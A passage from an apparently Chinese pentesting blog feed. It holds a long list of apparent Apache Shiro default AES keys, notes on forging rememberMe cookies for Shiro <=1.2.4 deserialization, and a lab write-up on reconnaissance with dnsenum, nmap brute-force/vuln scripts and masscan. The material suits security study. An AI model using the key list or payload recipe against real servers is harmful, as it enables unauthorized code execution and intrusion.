4Dvg==<br>arnCyNG11LS/XMjF5ckKDw==<br>asImMWVQomqFU234+PmaSA==<br>atn+sDJtu2lGpKqWAMTBhA==<br>ayRW9VUXsAnbPbVStLcITQ==<br>bAs99sjQCdrGkX5Q01bWEw==<br>bxZQGR7TDAigQizh9lH2JA==<br>c0qQHzrRa/T8Mf0l6H+90A==<br>c6Uc0HTa7k4fvkFCkuJITg==<br>cHHr+Qpi+Xi3e7VGRugddg==<br>cTHiZHEszKKag1lKa+mKvQ==<br>caYIJ4PKftngqyIg8+YN9Q==<br>cbFPIbyf4mlv02MzHgF2rw==<br>clKY0Cx5neyUezjY0SwEuQ==<br>clZhrCN1I+VbFCGNsVkEiA==<br>cntMsMivwe4IsnWHA8ojtw==<br>cqEY26TR40vtmcgLtzXuEg==<br>ctatwWPonT9asCD1Xd9/5A==<br>czI1Pc0ajoTUrfmGsCQUjw==<br>d+jQ30vufpb5+lUYjT1nYQ==<br>d3LMihVDcI4fwxwocmTEvw==<br>d8Hmf7jfowPbnkiefDb+Sw==<br>dBdeu+9+OnBBxpGvRPjJ/Q==<br>dCOWshdJwFAcf+qLwUe/HA==<br>dJOhN2Hz3SB/K08rOWQ07A==<br>dKQgJQM/SEXIv3D2U2BLLQ==<br>dQs2xTXT3f86W6Ga2xjRTw==<br>dSElt4CZVAf7mXQlIQGgdg==<br>dhbQJptL7bP3elOzvRoBZA==<br>dkwe6n4PPAcRMmZhBG6uAg==<br>dsesfswfjn23409isfadAA==<br>duvI/5lJBm1p16InaO2IHg==<br>dv23QPiv17KhKxPYw+LaqQ==<br>dxvOQklgvjWQsaVmVqqDag==<br>e+hNRfVOpEuNI0Tz2/Z1zQ==<br>e3xEI91uMej9kMVoR3O6cA==<br>e8tyr9KH+eQDjYoNe5uISA==<br>eDDcywsTQLgD0jv8txgfgA==<br>eF49VEaI7nzFubJ/1YMW3Q==<br>eIBmReoHnQE8QpezBg96LQ==<br>eIbVurGQwMcwBwibhdCStQ==<br>eKAtvlkS4Sg0P3WtWq/CFQ==<br>eLAPYEnxRxv1y7YmUaMS7Q==<br>ePD6C5YhbaRlOxi5IzBiNA==<br>eQenOR0MiUdqVp2q6EzVfg==<br>eRAI4qw17Gk7TC2e7270fQ==<br>eVNnrlql+ozZQvxznwyRwg==<br>eZiC1NLcP3ZF2j4s0/TtVw==<br>ecZIaXxIP4GAFlSQJhnM/Q==<br>eg4ExfXBIlIqaBsXP+uiKg==<br>emRdeAprDZ7u9RmpvuCI6g==<br>enpyX2Nvb2tpZV9rZXkAAA==<br>epslfB+UfHbGKJBHxoW5aA==<br>eqqH7Afdc/joWJiKqrY9Ng==<br>esIFhH1i4dluPefLq9YuMQ==<br>etVIWI1LRDu5U5Y4rM8MAg==<br>f16qEEBy1ifeiozjYXU9kA==<br>f5KSsKNlnWsAuGQEfTqF9w==<br>fAOhaWOz5eVekXl7a0YeKQ==<br>fAjy5xG9sDVid3AWBUB0pA==<br>fMAUSJqC/zJOEZOodWvJhw==<br>fcq+/xW488hMTCD+cmJ3aq==<br>fgeqMjT3DZHUqKQCKToWXg==<br>fjL4Z8Pswu5nue712ux6Fw==<br>fkPzDy46ixPw5E7rtuujew==<br>fmwUQnLYgDRIWz5vTdbKRA==<br>fyky+G+P8/XRX3CFuMe70w==<br>g505NhJYIOupAmEjw5ddEw==<br>g5ewm7WJc2sUnkDY6SLj5g==<br>gDPjdNSA72TtGlY09QYgcg==<br>gGVVrU3tHXvKK9AcixHe+A==<br>gLGnrqn2l3kYhE1d+rYrbQ==<br>gNWb+Qi2C/qF/F1jcWRnhw==<br>gUL0C3OU+Q9UgKqp3scoag==<br>gWMaJL5DD6zDGn+g8sLEig==<br>gXeVotXfQ/3sVgU3QNGu3A==<br>gagDOciQ8Vu+zRC2dD2RaA==<br>gdsEc/5SDdlZCrhksvq1/w==<br>gh/TCYN93/Rimgv02O0OtA==<br>gm7XujoeC7Lr5XtlNTg0mg==<br>gorTaGLZin0diS0pubIsFw==<br>gp32s2iKKrxe3gjx/+Zb+w==<br>gscO3vAVprs2KAgKZfLeEQ==<br>h/okoqkglVxuGA0iJz5c+w==<br>h2q1et6Po90LAKzq3pRwUg==<br>h3G6nJ8DogwWJwbJke0BuA==<br>hJ5zAP4V5V8QCrtQJ0BdEw==<br>hJmIqflinJiougKHjf6/gQ==<br>hLeds76xCNsWaT0cDs6z8w==<br>hQ4ZfMNvm9QpbUkUZ245Ng==<br>hQPaEAp+Uz/lIGTZ4nEnAA==<br>hYK4jrzaDud+R73c8OOKew==<br>hh2eycp1zprStKiXC8G7Ug==<br>hi6igx3kZ3kzKrp2awOxUw==<br>hkvPHf5hKr+0bu1NLNvuKw==<br>hnQ6/3gOdsxBM/J+TQ+h3g==<br>hnZ0xb7t7ATtlqQve94CaA==<br>hqFmMAqTUXHmsLvsAaFWOw==<br>hydjS5HItmn/8WT8sofTiQ==<br>i4f61DGtOvM1kup49TdUXw==<br>i9a9F0BgCJT5JicwPaH6rw==<br>i9grFjucwAtKd153/qIIqg==<br>iBmetixJnj3rXIx+NxtKEg==<br>iJBpbYLrFFdTVwkegX2zTA==<br>iKi0XKxsivI728hyUbNv9Q==<br>iKygDyKEQ+RBHNV1tipHkg==<br>iLj7EOWlNryTsqekWcZaSg==<br>iOT+QKetxw4ZMBes438nYw==<br>iPkbVi+dhsykLmnvR1GiwQ==<br>iTLtyiWRiqye9GWlh46wEg==<br>ig295VyXfcr7WjYatMZGzg==<br>ivazQmxWOmBExSIpF1J9sQ==<br>j/XRd0lirr08bFIgBvS/wQ==<br>j7PNUBNq7qkfcPWU/tXauQ==<br>jJZ4j/xjSQxWtngCk52e1Q==<br>jNbcLmxTzydpF1DHOhhxyQ==<br>jO6Do3PKndQb3DVPQuLf0A==<br>jcrU8WDhgrth1FdRnwsklw==<br>jeoq9Gpi/YnSyIFq97Ldkg==<br>jjYTxI4L+KCuuJZqHq0x1Q==<br>jpcVaBhNkx7MS1SxRecpmg==<br>jpkjzDBNhdCe82Gigv3qOw==<br>jqdfJBP9tITnYZKxXU1CDg==<br>jw2r2XPI4j4OLFDYtD2Rtw==<br>jwgaFzdpReuEuPkkown+EA==<br>jx1IcFTh6W2atCS/Bc6t/w==<br>k3eHFlm5B8vqOSRwvxKTgw==<br>kCCaUwSKJ86Yd51edXFa0w==<br>kF5zCKYapekD1nfECd6ZnA==<br>kFZz7FHqbXBmYS1NW/8cWQ==<br>kKKRmFDe0Ji9g5AdJ3apcA==<br>kKYxEOWn0H5+YNlfX7IObA==<br>kN2OaR5TqldmZlrcHqDnZA==<br>kPv59vyqzj00x11LXJZTjA==<br>kYB5/1U8tcXXof88H8xPlA==<br>keTRMjLlMXCLFDnIqztsoQ==<br>khEcHvSJbAUPM/pIyK9mPw==<br>kqTJCp1featbhyw7jTFYYw==<br>kv58wnIjGD/z8oOrD7u//w==<br>kvehJmOhxUH28P3Fqxd3TQ==<br>kxOUUaWSF4AL6r8DvkfOOg==<br>l6NgJ0Cx3EQypphGotpi5g==<br>l8UXW+AoYklIH7we3bAXIg==<br>l8gw/I0XGAljwxThcoc4xw==<br>lAOnKOpdoUY1UNhmfTPGdw==<br>lKAvKzqZizqW6NIKXznH6A==<br>lOwFgM/dqZXXBxaqaby7sQ==<br>ld/TklCGmgoKjASiaZO4Vg==<br>lpqAaZD3J+4O/qFz4OmPrA==<br>ltOUZ4rRGyU5N+NOgSj41g==<br>m05ZZ9L4jjQXn7MREpb7AA==<br>m8QW9x8efj+drr+BlCcz9A==<br>mLA5w3x7Snh+IpB93uhEUw==<br>mRfrdiNj7616ZfHZ1GGgzw==<br>mSfK3eJLpnu10P4EJCOptg==<br>mXFxXYeWJk9VlusBnG4O8Q==<br>mY7wtxGTzm45WjekUJ/8jA==<br>mZF/GuHb8Ru01c4AqhcUKA==<br>mbPOU6Bicp+qfM40ZtCtew==<br>mkdlTv+aEXnrrn9aF8djwQ==<br>mt1dfvEhxJ5iCG0XAKwXtw==<br>mwTvS9wftMmeo/VCLhhD7Q==<br>n/H/9WotS/XT7xCChs2WLQ==<br>n8T5hZWHAj1K8XTbt4qbNQ==<br>nP3VFneEItDmYUwme2842Q==<br>nYlUKrxAB6geGRVWkxMOSw==<br>nfvFo4PjKBkLiTEpo3APHw==<br>nixWQpJdDKLAxpEwjlmFiQ==<br>nlBYYjIH6ROTrOo8bUaSjw==<br>nlDRTKndpcIXZD/+ZnSbWQ==<br>nx12iAW12CkB4R/KsijG2A==<br>nxfo1oYcJCo1knGwEiFMWg==<br>o+x6Hu8oT3P+/v0wrLM2Qw==<br>o0JRyHDliwkfVGLlBBFXZg==<br>oGAJj5ptvxn+fePc7p12Rw==<br>oOb9pJBSAdWN7lhifj3sLQ==<br>oPYfpwZrE5YZqV7kQtDaGw==<br>oPgANeWJACdwQd4NJ1zHKw==<br>oT4m6z+gd+Qj0ZBz1RZ5qg==<br>oX/XTCGgj2bIVBr4TEwzEg==<br>ob7j+RFt0AYRlj80VVdRyg==<br>odfMvPFeBz8CkTGcrIvdFg==<br>oeOAqlwsz7YGh/IqqhQ+Jw==<br>oektKzqtSu8kpqcsS2Sg4g==<br>ofjz4Ln/Wl7FuMC9Vg19mA==<br>ok14FnCz9IltBii+BiXveg==<br>ok8wssACq+UGPk78xx69fA==<br>osJ0HzCBt5/Y0umy+9Qqaw==<br>otifL/3x7EznbJPnyZ+ECQ==<br>ouaD8k/vPrj3ciMATK+2/w==<br>oy8ELUj/VgzlCNdWf3h//Q==<br>p3dp8ojPX4R0GRMVeSAd4Q==<br>p5BESMRL9wyZ1oj7B6geHg==<br>p6bIYZCynq7cXFFrdGAl1Q==<br>p7NcX6q0slluQCAWEGdwVQ==<br>pKLt7P9oogEfSc77KEQoZQ==<br>pLed3YBRRIhitK3C8+PxHA==<br>pSj0ujKIu9rqWE6KiqkXwQ==<br>pSnUw0ykd+COIvsJGFq3rg==<br>paVp5kn5aOLQwNXf4XIBjQ==<br>pcJOpNekDJEtXIFb7TeU8g==<br>phDoODMycFSFCdBTTmDxNQ==<br>pnAyV1S2EggTG1uJqbGomw==<br>prx0GOkoatLNrtYIbfoPxQ==<br>psEX/kWfxE0INGre8QDHDw==<br>pvXSm7Eh4i0LqULmcFyUhw==<br>q4rYOgVnG2Qi+yYQZgprew==<br>qIhbwUpNl6YUe+gjPP/NEg==<br>qJnaEQtpTumShsoEBPTS/w==<br>qKfduuy+f7TW8BnOJuZeHw==<br>qMEzyGxs6PcHCe16m+DZKA==<br>qMQfy3WOiHLyYkzcXpNsLA==<br>qPr9FPiu5Vu+6soaD2W9Rw==<br>qTxK2Riqb0nIq02mZ30Y2A==<br>qUbzSwjhBfAWpOiOugYe5w==<br>qajDHDT91DFjQvf+vZR7Kw==<br>qvi4m0lRfl0Zizk5ip1r5A==<br>r20flUTNuoVqV3fnJsMUwg==<br>r89fpQXp13fmF4kzUfDuoA==<br>r8eg47skSEyfA2btmErRQQ==<br>rD03BQk2kdBkqqNNL+HWVA==<br>rDzITdJ0ayTaG3S1pulFxQ==<br>rE7cQLcfrjoHVUhU31kALw==<br>rEXZ5oHbZOKgs2MBJdTkEA==<br>rFLib6x+ktTecvkpxt6OFg==<br>rGbM1vT+zLmRqThyn/VIwQ==<br>rMe6KnHoN/7M1YE/EPRhhQ==<br>rOR/3TpLLCVwLC7l07r90Q==<br>rOvHadwM8KttfSOi/q1Pvw==<br>rQQKRPVmmpIQ8cljFPHIYQ==<br>rQc3dKkwP45hAb2pXHnM/A==<br>rVeaKPC//gvovFD1If4nHg==<br>rVnuqPTlXkEtQR0CsdxV9w==<br>rXLUcoImJP8RBgP8L64uGQ==<br>ra/xC+nrOTuI/vPdLYfpGQ==<br>ran5rq7YzA6hG7wQTZsP6Q==<br>rcuaIKtKMQbZh9O+LQ0y9A==<br>rdHI8JgsiklSqDiHj6FTPg==<br>rdOa2Brixuhnc+K2+lcNFw==<br>ri7bl4Q32mnFLX4HyqJyYQ==<br>rvovJeBXWeI4ohSPNnfzjw==<br>s/wTft5+uSaONMF3vnlZkw==<br>s2mFzuS3Cw985oS++umoGQ==<br>s9h9uiscldRNfCNy672Xfg==<br>sAcbMSdf2dz4hBtz+uKGsg==<br>sBCqEOwraWJEHpOJjWPU4w==<br>sBZ+y0i5UfLmLwf5EjXHlg==<br>sFTAHkio5ljbhBxWWiDh+Q==<br>sGhc4rkEcYumNA8WahqwJg==<br>sIfaz3uuv/KpmCp70W/gwQ==<br>sNr3NaS3o58cvxyL6tC5WA==<br>sZ6glnU252P46aeK1qEQog==<br>sdodasF2xI446mVp5UIM2A==<br>sfXaK7Slf0qPeQNEi7jK8Q==<br>siHt7SxnHhaI86OIrArMwA==<br>slnGASPnV2E1ZDCU8Yrd0Q==<br>srNnRz3w7RBWKCU/zjTmYw==<br>sy05dMAiiJtLfoCo29xjrg==<br>t41dczuACfHuZK1tckv/5Q==<br>t50cFSIgZ9c/86OCrZ8X7w==<br>tDxnIAIcal1pg0ajWxI56A==<br>tEOJKNEX+Q/FthUWNLwxOw==<br>tFHEWD1iAftKlAO+h7FrWA==<br>tQa31QsLrMT3gp3EjMu4Vw==<br>tTDwW0Tn4cQQcp8Qu23ZTQ==<br>tVWukoRTPhoMyRHJ0Verfw==<br>tW0NnDW8fP83y5Q5HMr6ew==<br>tXdQr43/fZpfP3LT0dWgIQ==<br>tfYteaCxNqGoDe5WGPKHBQ==<br>tiNQp1lwJCnEvU4CsZoDjw==<br>tpXDa3rd1T8Is3Esk6774A==<br>tuPBaCh7xvo/aaqL3dbw6g==<br>u6jFX/puCoaWgj605jG2Aw==<br>uA/LpLw5VGa5ZAOYlKqFYg==<br>uEqDzVoHwFd6bOmWF5mfkA==<br>uHDj/ApSuPah0ATdmFtneQ==<br>uQq7qzqMdTkReRclk/vg3w==<br>uXCDAhHvZ2Xi2JrMQPHz0w==<br>ueLnhDgNYs0l6CNY2ie0HA==<br>uiZDeD9f999GmetIA4wspw==<br>uizChCzf7D4gHr7cYhJysg==<br>uppV9kZeD8kihlYY+VAGCQ==<br>uvZe+X2+GyV/zzgVdNOUyw==<br>v4M2sMhcxz5zXpWst9LxDg==<br>v4nkwWOqi6gO4pTD1kwdXg==<br>v6J1Z6oJcUCCJeg/U7q4qA==<br>v9hbbr19KYfwYMODGS4fVQ==<br>vIFcqWLpL5sZN0NKuRRLcA==<br>vKjf7jtnLVzKlpiEBj6g6g==<br>vY2CPWf08YvTlxHZHxJB5g==<br>vYFLuRvchlgmo3fWMEAVOA==<br>vzKf4la46A+sdpblFEn60A==<br>w2vMYewyr+KXmNlv39XEEQ==<br>wH1KOSuiv7Kn6GeNVZ9+7w==<br>wMa+wwDpXgJwyjrqQGre5Q==<br>wRTQp0M40hcUq6p22x6DNQ==<br>wY5M5k/cJ5cd8Scms+Ivvw==<br>wgMkUJ0+IHKwc163fwW6WQ==<br>wpKnsDvV7zzReQSmY05Jfw==<br>wyY0puJrynwfuBoX/5SfXg==<br>x5RT17zr46N4v32uMGoT7Q==<br>x8OUddV52M1sD2iX1TgwPQ==<br>xY/Py8rrXpIaiP5DYHKHJQ==<br>xaOWanZ5FMwjZLcg3OkZpg==<br>xfHhfJa8H2fhxb70d4wPhg==<br>xliLxYKmWp7FdJDTvR64aw==<br>xvhzjL0Dz3zX0J5H6+G7mw==<br>xxOUGpTHB6ZL6FcjXxNmZg==<br>y+iKxEfLmoz/46fcMdne5g==<br>y+lrzDXb0bQi74d7a2YsoA==<br>y9N/A+XzRNmFhBSJMnwtew==<br>yWz42JvzwNDc/xifdSINLA==<br>yg8tW9kDLR7wzoSLvPwvwg==<br>ygJw7ry1XevpnCys1hOmZg==<br>ykFi595/Fl04fJ2xuBYwYw==<br>yl3gvDmII9F74JQSaPUuIA==<br>ypb2mLD/Y9ZF4LlsPGRJUw==<br>ys6irM6SToSvJtWOfere4Q==<br>yunQrhFO8OmTyUwFz/OCVA==<br>ywM+CNdZoaXVGX9ybf9btQ==<br>z4rUCB8E9U71fFOwh//GjA==<br>z9Pdt1YVDM+4O0qjVSMz1g==<br>zC8aC11AVNa1g3rHB5p8tg==<br>zFz5Hu1NTuGLNZfmmPRUuQ==<br>zGB+ygayX4v8GHrp/vYOyg==<br>zGTO3faB2+62LU9ZV81b8w==<br>zH+m8pQ49HUq3Ru7Oym9/w==<br>zKi5alGrBnK0lWU0rLZfrQ==<br>zWbMTzTmFtUVciUE3Yo2Xg==<br>zZG0cSIvFgY83wrVLVYj/w==<br>zcR8SLYBJFyOknQxqW46Hg==<br>zfDkwwF9ydiIbXTMxRaHGA==<br>znJ984VkEEKwW5ZbbCYd0Q==<br>zx9DvPzTSauVSdn2XDWIdg==<br>zy1KJFZ6eucDxK6nGW0xcQ==<br>lxuEtAWbv+SgUOXREM+zrA==<br>2AvVhdDFCVdfdfDFAdag==<br>Kyjwds5ZLEBUhA4a9O1DhQ==<br>4AvVhmFLUs0KTA3Kpr3sd3ag==<br>ikB3y6O9BpimrZLB3rca0w==<br>6GvVhmFLUs0KTA3Kprsdag==<br>6Df5w6FRPCVQV0dhhUrZZ<br>2AvHhdsgUs0F0A3SDFAPa==<br>7gzYfKjTASKdsai43ds==<br>LafjwUgsDlNmnet47IJQWg==<br>2AvHhdsgUs0F0A3SDFAPa*==<br>pMvTx48hLt+/C8D+cM5vR==<br>zzrsUhmFL9Ks0KTLUsvV4AAdzz==<br>dG91dGlhbzEyMzQ1Ng==<br>2AvVhdUs0FSA3SDFAdag==<br>AvVhmFLUs0KTA3Kprsdag==<br>WWFuemhlbmcg5Lil5q2jAA==<br>W2h5bXNdY29va2llQA==<br>dG91dGlhbzEyMzQ1NQ==<br>dWZkbXBhc3MxMjM0NTY3OA==<br>9Jo0hLz8XhDpPsOOYOnSUA==<br>bT3ovvD7RfGDc0BXO5ORyA==<br>1t43gns419h1g61dpnpfe<br>4AvVhmFLUsOKTA3Kprsdg==<br>UFz8ias3ZKYzku/ZUuG9yw==<br>P7sWnbtUYuVxgVFvFlHpvQ==<br>k3+XHEg6D8tb2mGm7VJ3nQ==<br>GhMXBsUK/105DRCJvsCt/A==<br>ZGdmdwAAAAAAAAAAAAAAAA==<br>6Df5w6FRPCVQV0dhhUrZ*Z<br>Us0KvVhTprsAm43KFLAdag==<br>bQY8T1A6hrHOfQrg0mv7Eg==<br>bSqtfpTeQHIOOKKjugqPjg==<br>blyGEQEhBYYVjrzAzP30GQ==<br>btQuG8vtGbZsLFZH88e//A==<br>2weDYcR3DPa6nf8Z42d2XQ==<br></code></pre></td></tr></table></figure><p>  payload产生的过程</p><blockquote><p>命令 &#x3D;&gt; 序列化 &#x3D;&gt; AES加密 &#x3D;&gt; base64编码 &#x3D;&gt; RememberMe Cookie值</p></blockquote><p>  所以我们只要得到aes加密的密钥，就可以构造payload</p><blockquote><p>任意http请求中 cookie 处rememberMe参数</p></blockquote><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/shiro/image-20230831220206094.png" alt="image-20230831220206094"></p><p>  特征判断</p><blockquote><p>返回包中包含 rememberMe&#x3D;deleteMe 字段，认证失败时会设置 deleteMe 的 cookie</p></blockquote><blockquote><p>Set-Cookie: rememberMe&#x3D;deleteMe; Path&#x3D;&#x2F;; Max-Age&#x3D;0;</p></blockquote><p>  影响版本</p><blockquote><p>Apache Shiro &lt;&#x3D; 1.2.4（需要获取AES秘钥）</p></blockquote><p>  利用组件</p><blockquote><p>Apache Shiro &lt;&#x3D; 1.2.4（需要获取AES秘钥）</p></blockquote><p>  payload 构建</p><blockquote><p>命令 &#x3D;&gt; 序列化 &#x3D;&gt; AES加密 &#x3D;&gt; base64编码 &#x3D;&gt; RememberMe Cookie 值</p></blockquote></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实验</title>
    <link href="/2023/08/20/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/"/>
    <url>/2023/08/20/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过实验学习域名查询IP和IP反查域名，了解什么是CDN，通过判断是否存在CDN来查找CDN背后的真实IP，学习旁注和C段嗅探。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>无特殊要求，能访问互联网即可。</p><h2 id="实验步骤一"><a href="#实验步骤一" class="headerlink" title="实验步骤一"></a>实验步骤一</h2><p><strong>任务描述：域名查询IP和IP反查域名。</strong></p><ol><li><p>域名查询ip:</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230820235747511.png" alt="image-20230820235747511"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821000127195.png" alt="image-20230821000127195"></p><p>可见，同一个域名，访问出了两个IP地址</p></li><li><p>IP-&gt;域名</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821000342505.png" alt="image-20230821000342505"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821000404898.png" alt="image-20230821000404898"></p></li></ol><h2 id="实验步骤二"><a href="#实验步骤二" class="headerlink" title="实验步骤二"></a>实验步骤二</h2><p><strong>任务描述：探测IP真实性：判断是否存在CDN—&gt;查找CDN背后的真实IP。</strong></p><ol><li><p>检测的方法</p><ul><li><p>多地ping</p><p>判断是否存在CDN可以使用ping方法，在不同的地区ping同一个域名，查看对应IP地址是否唯一，如果不唯一多半是使用了CDN。</p><p><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p>多地ping包括了外国ping</p></li></ul></li><li><p>查询子域名的IP</p></li><li><p>查询历史DNS记录中可能存在的使用CDN前的记录</p><ul><li><p>解析目标域名的AAAA记录</p><p><a href="https://github.com/blechschmidt/massdns">https://github.com/blechschmidt/massdns</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>然后输出hetianlab.txt<img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>包括了解析器IP地址，以便在检测到某些解析器产生不良结果时便于过滤输出。</p><p>dnsenum：查询网站的主机地址信息、域名服务器、mx record（函件交换记录），在域名服务器上执行axfr请求、通过谷歌脚本得到扩展域名信息、提取子域名并查询、计算C类地址并执行whois查询、把地址段写入文件。</p><blockquote><p>dnsenum hetianlab.com -v </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821011319261.png" alt="image-20230821011319261"></p></li></ul></li></ol><h2 id="实验步骤三"><a href="#实验步骤三" class="headerlink" title="实验步骤三"></a>实验步骤三</h2><p><strong>任务描述：旁注和C段嗅探</strong></p><ol><li><p>使用bannerscan进行C段BANNER与路径的扫描</p><p><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li></ol><h1 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h1><h2 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过实验学习端口扫描的常用方法，利用相关工具检测服务器或指定IP段的端口开放情况。</p><h2 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h2><p>无特殊要求，能访问互联网即可。</p><h2 id="实验步骤一-1"><a href="#实验步骤一-1" class="headerlink" title="实验步骤一"></a>实验步骤一</h2><p><strong>任务描述：nmap工具简单介绍。</strong></p><ol><li><p>NetworkMapper（nmap），是一款开放源代码的网络探测和安全审核工具。手册地址：<a href="https://nmap.org/man/zh/">https://nmap.org/man/zh/</a></p><p>“所感兴趣的端口表格”是其中的关键。那张表列出端口号，协议，服务名称和状态。状态可能是 <code>open</code>(开放的)，<code>filtered</code>(被过滤的)， <code>closed</code>(关闭的)，或者<code>unfiltered</code>(未被过滤的)。 Open(开放的)意味着目标机器上的应用程序正在该端口监听连接&#x2F;报文。 <code>filtered</code>(被过滤的) 意味着防火墙，过滤器或者其它网络障碍阻止了该端口被访问，Nmap无法得知 它是 <code>open</code>(开放的) 还是 <code>closed</code>(关闭的)。 <code>closed</code>(关闭的) 端口没有应用程序在它上面监听，但是他们随时可能开放。</p></li><li><p>nmap的功能</p><p>1）主机发现：检测网络存活主机</p><p>2）端口发现：检测主机开放端口</p><p>3）服务发现：检测相应端口软件及版本</p><p>4）检测操作系统、硬件地址</p><p>5）检测脆弱性漏洞</p></li><li><p>端口状态</p><p>1）open：端口开启、数据到达主机、有程序在端口上监控</p><p>2）closed：端口关闭、数据到达主机、没有程序在端口上监控</p><p>3）filtered：数据没有到达主机，返回结果为空，数据被防火墙或IDS（intrusiondetection system，入侵检测系统）过滤；</p><p>4）unfiltered：数据没有到达主机，且不能识别端口的当前状态</p></li><li><p>nmap的基础用法</p><ul><li><p>单一主机的扫描</p><blockquote><p>nmap 192.168.1.2</p></blockquote></li><li><p>子网扫描</p><blockquote><p>nmap 192.168.1.1&#x2F;24</p></blockquote><p><em><strong>&#x2F;24</strong></em>的意义是使用24位的子网掩码，就是所有的IP地址</p></li><li><p>多主机扫描</p><blockquote><p>nmap 192.168.1.2 192.168.1.5</p></blockquote><p>也就是添加多个ip地址</p></li><li><p>主机范围的扫描</p><blockquote><p>nmap 192.168.1.1-100</p></blockquote></li><li><p>使用表格扫描</p><blockquote><p>nmap -iL target.txt</p></blockquote></li></ul></li><li><p>nmap常用的命令</p><ul><li><p>系统漏洞检查</p><blockquote><p>nmap –script smb-check-vulns.nse -p ip</p></blockquote></li><li><p>数据库密码检查</p><blockquote><p>nmap –script&#x3D;brute ip</p></blockquote></li><li><p>收集目标的应用服务信息</p><blockquote><p>nmap -sC ip</p></blockquote></li><li><p>检查常用的漏洞</p><blockquote><p>nmap –script&#x3D;vuln ip</p></blockquote></li><li><p>检测应用的弱命令</p><blockquote><p>nmap –script&#x3D;auth</p></blockquote></li></ul></li></ol><h2 id="实验步骤二-1"><a href="#实验步骤二-1" class="headerlink" title="实验步骤二"></a>实验步骤二</h2><p><strong>任务描述：其他端口信息收集工具简介。</strong></p><ol><li><p>masscan</p><ul><li><p>单端口扫描</p><blockquote><p>masscan ip -p port</p></blockquote></li><li><p>nmap功能</p><blockquote><p>masscan –nmap</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li></ul></li><li><p>scanPort</p><ul><li><p>指定端口号，扫描hetianlab.com的开放端口，使用1000个协程进行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li><li><p>指定IP范围，扫描192.168.78.1-255网段的端口80-10000：</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li></ul></li><li><p>astsu</p><p>用Python3写的网络扫描仪。将TCP Syn数据包发送到已定义端口上的目标，如果该端口已打开，使用nmap扫描检查该端口上运行的服务，并打印找到的所有端口。</p><p><a href="https://github.com/ReddyyZ/astsu">https://github.com/ReddyyZ/astsu</a></p></li><li><p>第三方网站</p><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p></li></ol><h1 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h1><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p><strong>域名</strong></p><p>域名（domain name）又称网域，是由一串用点分隔的名字组成的Internet上某一台或计算机组的名称，用于在数据传输时对计算机的定位标识。</p><p>由于IP地址具有不方便记忆、不能显示地址组织的名称和性质等缺点，设计出了域名，并通过网域名称系统（domain name 